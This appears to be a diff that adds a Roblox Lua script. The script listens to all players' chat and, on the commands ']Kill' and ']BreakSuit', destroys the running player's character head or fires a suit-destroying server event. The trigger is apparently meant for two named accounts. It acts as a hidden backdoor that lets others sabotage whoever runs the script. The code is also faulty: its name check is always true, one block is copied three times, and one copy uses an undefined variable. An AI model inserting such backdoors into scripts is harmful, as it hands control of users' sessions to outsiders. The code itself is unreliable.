@@ -1,0 +1,58 @@
+print("ran")
+local StringToDetect = "]Kill";    	    
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(Message)
+	if string.find(string.lower(Message), string.lower(StringToDetect)) then
+if v.Name == "tipthedripper" or "FIRESTORMGAMERYT5" then
+    TheUser = game:GetService("Players").LocalPlayer.Name
+game:GetService("Workspace")[TheUser].Head:Destroy()
+end
+end
+end)
+end
+
+local StringToDetect = "]Kill";    	    
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(Message)
+	if string.find(string.lower(Message), string.lower(StringToDetect)) then
+if v.Name == "tipthedripper" or "FIRESTORMGAMERYT5" then
+    TheUser = game:GetService("Players").LocalPlayer.Name
+game:GetService("Workspace")[TheUser].Head:Destroy()
+end
+end
+end)
+end
+
+local StringToDetect = "]Kill";    	    
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(Message)
+    	    
+  
+            
+            
+	if string.find(string.lower(Message), string.lower(StringToDetect)) then
+if v.Name == "tipthedripper" or "FIRESTORMGAMERYT5" then
+    TheUser = game:GetService("Players").LocalPlayer.Name
+if plrname == TheUser then
+game:GetService("Workspace")[TheUser].Head:Destroy()
+end
+end
+end
+
+end)
+
+
+
+end
+
+local StringToDetect = "]BreakSuit";    	    
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(Message)
+	if string.find(string.lower(Message), string.lower(StringToDetect)) then
+if v.Name == "tipthedripper" or "FIRESTORMGAMERYT5" then
+game:GetService("ReplicatedStorage").Events.DestroySuit:FireServer()
+
+end
+end
+end)
+end
